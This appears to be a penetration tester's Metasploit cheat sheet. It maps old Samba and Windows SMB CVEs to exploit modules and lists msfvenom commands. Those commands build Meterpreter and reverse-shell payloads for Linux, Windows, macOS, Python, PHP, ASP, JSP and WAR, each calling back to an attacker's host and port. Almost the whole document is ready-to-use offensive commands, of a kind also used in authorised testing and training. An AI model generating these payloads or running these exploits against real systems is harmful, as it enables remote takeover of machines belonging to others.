# Metasploit
#exploit #msf #metasploit


## Post-Modules
Name | Desc
--- | ---
`local_exploit_suggester` | finds exploits in x86 envs


## Correlation
Service | CVE | MSF-Module
--- | --- | ---
Samba 3.0.20 | [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447) | exploit/multi/samba/usermap_script
Windows <7| [CVE-2008-4250](https://nvd.nist.gov/vuln/detail/CVE-2008-4250) | exploit/windows/smb/ms08_067_netapi


## MSFVenom
Source: https://netsec.ws/?p=331
Name | Desc
--- | ---
`msfvenom -l` | show payloads


### OS
Name | Desc
--- | ---
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > shell.elf` | ELF / Linux
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > shell.exe` | EXE / Windows
`msfvenom -p osx/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f macho > shell.macho` | macho / Mac / OSX

### Prog-Langs
Name | Desc
--- | ---
`./msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.1.1 -f raw -o test.py` | Python payload

### Web
Name | Desc
--- | ---
`msfvenom -p php/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.php && cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php` | PHP
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp > shell.asp` |  ASP
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.jsp` | JSP
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war > shell.war` | WAR